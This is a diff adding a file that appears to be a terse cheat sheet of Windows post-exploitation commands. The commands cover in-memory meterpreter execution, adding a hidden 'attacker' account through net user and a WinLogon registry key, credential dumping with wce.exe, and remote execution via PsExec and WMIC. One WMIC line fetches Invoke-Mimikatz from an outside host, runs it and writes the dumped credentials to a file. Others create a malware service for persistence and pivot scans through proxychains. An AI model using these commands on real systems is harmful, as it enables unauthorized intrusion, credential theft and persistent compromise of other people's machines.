@@ -1,0 +1,16 @@
+/etc/resolv.conf
+meterpreter> execute -H -m -d calc.exe -f <memory executable + parameters>
+net user attacker password /add
+REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\WinLogon\SpecialAccounts\UserList /V account_name /T REG_DWORD /D 0 
+Veil-pillage
+wce.exe -w
+PSexec \\IP address -u "domain\user" -p password cmd
+wmic nicconfig get ipaddress,macaddress
+wmic /USER:"domain\user" /PASSWORD:"Userpassword" /NODE:192.168.0.119 process call create "powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.0.109/Invoke-Mimikatz.ps1'); Invoke-MimiKatz -DumpCreds | Out-File C:\\users\\public\\creds.txt
+tshark -i 1 -VV -w traffic_out
+net use \\advanced\c$ /user:advanced\username password
+dir \\advanced\c$
+sc \\remotehost create backtome binpath="c:\xx\malware.exe"
+use auxiliary/scanner/netbios/nbname
+background
+proxychains nmap -vv -sV targetinternal
